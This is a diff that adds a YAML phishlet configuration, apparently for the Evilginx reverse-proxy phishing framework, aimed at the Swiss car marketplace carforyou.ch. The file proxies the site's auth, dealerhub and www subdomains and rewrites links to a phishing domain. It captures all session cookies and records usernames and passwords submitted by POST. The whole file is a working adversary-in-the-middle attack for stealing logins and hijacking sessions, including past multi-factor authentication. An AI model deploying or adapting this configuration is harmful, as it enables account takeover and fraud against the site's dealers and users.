@@ -1,0 +1,47 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+ - {phish_sub: 'auth', orig_sub: 'auth', domain: 'carforyou.ch', session: true, is_landing: false, auto_filter: false}
+ - {phish_sub: 'dealerhub', orig_sub: 'dealerhub', domain: 'carforyou.ch', session: true, is_landing: true, auto_filter: false}
+ - {phish_sub: 'www', orig_sub: 'www', domain: 'carforyou.ch', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+ - {triggers_on: 'auth.carforyou.ch', orig_sub: 'auth', domain: 'carforyou.ch', search: 'auth.carforyou.ch', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'auth.carforyou.ch', orig_sub: 'auth', domain: 'carforyou.ch', search: 'dealerhub.carforyou.ch', replace: 'dealerhub.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'auth.carforyou.ch', orig_sub: 'auth', domain: 'carforyou.ch', search: 'www.carforyou.ch', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+ - {triggers_on: 'dealerhub.carforyou.ch', orig_sub: 'dealerhub', domain: 'carforyou.ch', search: 'auth.carforyou.ch', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'dealerhub.carforyou.ch', orig_sub: 'dealerhub', domain: 'carforyou.ch', search: 'dealerhub.carforyou.ch', replace: 'dealerhub.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'dealerhub.carforyou.ch', orig_sub: 'dealerhub', domain: 'carforyou.ch', search: 'www.carforyou.ch', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+ - {triggers_on: 'www.carforyou.ch', orig_sub: 'www', domain: 'carforyou.ch', search: 'auth.carforyou.ch', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'www.carforyou.ch', orig_sub: 'www', domain: 'carforyou.ch', search: 'dealerhub.carforyou.ch', replace: 'dealerhub.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ - {triggers_on: 'www.carforyou.ch', orig_sub: 'www', domain: 'carforyou.ch', search: 'www.carforyou.ch', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+ 
+auth_tokens:
+ - domain: '.carforyou.ch'
+   keys: ['.*,regexp']
+ - domain: 'www.carforyou.ch'
+   keys: ['.*,regexp']
+ - domain: 'auth.carforyou.ch'
+   keys: ['.*,regexp']
+ - domain: 'dealerhub.carforyou.ch'
+   keys: ['.*,regexp']
+
+credentials:
+ username:
+  key: 'username'
+  search: '(.*)'
+  type: 'post'
+ password:
+  key: 'password'
+  search: '(.*)'
+  type: 'post'
+
+auth_urls:
+ - '/.*/profile/edit'
+
+login:
+  domain: 'dealerhub.carforyou.ch'
+  path: '/en/profile/edit'
